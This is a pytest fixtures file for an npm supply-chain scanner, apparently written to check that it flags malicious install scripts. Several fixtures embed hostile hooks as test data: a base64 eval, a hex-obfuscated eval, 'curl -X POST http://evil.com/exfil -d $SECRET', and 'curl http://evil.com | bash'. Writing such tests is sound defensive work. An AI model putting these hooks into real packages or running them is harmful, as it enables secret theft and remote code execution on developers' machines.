"""Shared pytest fixtures for Dev Trust Scanner tests."""

import json
from pathlib import Path

import pytest


@pytest.fixture
def malicious_npm_eval(tmp_path):
    """Package with eval in postinstall script."""
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "evil-pkg",
            "version": "1.0.0",
            "scripts": {
                "postinstall": 'node -e "eval(Buffer.from(\'bWFsaWNpb3Vz\', \'base64\').toString())"'
            },
        })
    )
    return tmp_path


@pytest.fixture
def malicious_npm_network(tmp_path):
    """Package with curl in preinstall script."""
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "exfil-pkg",
            "version": "1.0.0",
            "scripts": {"preinstall": "curl -X POST http://evil.com/exfil -d $SECRET"},
        })
    )
    return tmp_path


@pytest.fixture
def malicious_npm_obfuscated(tmp_path):
    """Package with obfuscated code."""
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "obfuscated-pkg",
            "version": "1.0.0",
            "scripts": {
                "install": r"node -e \"\x65\x76\x61\x6c(process.env.MALWARE)\""
            },
        })
    )
    return tmp_path


@pytest.fixture
def clean_npm_package(tmp_path):
    """Benign package with normal scripts."""
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "clean-pkg",
            "version": "1.0.0",
            "scripts": {"build": "tsc", "test": "jest", "lint": "eslint ."},
        })
    )
    return tmp_path


@pytest.fixture
def npm_monorepo(tmp_path):
    """Monorepo with multiple package.json files."""
    # Root package
    root_pkg = tmp_path / "package.json"
    root_pkg.write_text(
        json.dumps({"name": "monorepo", "workspaces": ["packages/*"]})
    )

    # Clean workspace package
    pkg1_dir = tmp_path / "packages" / "pkg1"
    pkg1_dir.mkdir(parents=True)
    (pkg1_dir / "package.json").write_text(
        json.dumps({"name": "pkg1", "scripts": {"test": "jest"}})
    )

    # Malicious workspace package
    pkg2_dir = tmp_path / "packages" / "pkg2"
    pkg2_dir.mkdir(parents=True)
    (pkg2_dir / "package.json").write_text(
        json.dumps({
            "name": "pkg2",
            "scripts": {"postinstall": "curl http://evil.com | bash"},
        })
    )

    return tmp_path


@pytest.fixture
def malformed_package_json(tmp_path):
    """Package.json with invalid JSON."""
    pkg = tmp_path / "package.json"
    pkg.write_text('{"name": "broken", "scripts": {')
    return tmp_path
